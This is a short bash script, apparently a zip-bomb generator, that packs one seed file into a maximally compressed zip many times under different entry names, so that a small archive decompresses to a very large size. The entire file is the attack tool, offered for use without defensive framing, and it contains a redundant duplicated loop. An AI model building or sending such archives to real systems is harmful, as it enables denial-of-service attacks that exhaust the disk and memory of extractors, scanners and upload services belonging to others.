#!/bin/bash
#set -x
Usage="Usage:\n\t\
    make_bomb.sh rank seedfile\n\t\
    eg:\n\t 
    make_bomb.sh 2 seed.txt\n\t
"
if [ -z "$1" ];then
    echo need params,like 1,2,3,4,5....
    echo -e $Usage
    exit 1
fi
if [ ! -f "$2" ];then
    echo $2 is not exists 
    echo -e $Usage
    exit 1
fi
file=$2
zipfile='zip_'${1}X2g_$(date "+%s")'.zip'
seed_path=$(cd "$(dirname "$2")";pwd)
cd $seed_path 
for((i=0;i<$1;i++))
do
    filetmp=zip_${i}.txt
    mv $file ${filetmp}
    zip -rj9 $zipfile ${filetmp}  
    mv $filetmp $file
done
for((i=0;i<$1;i++))
do
    echo $i
    filetmp=zip_${i}.txt
    mv $file ${filetmp}
    zip -rj9 $zipfile ${filetmp}  
    mv $filetmp $file
done
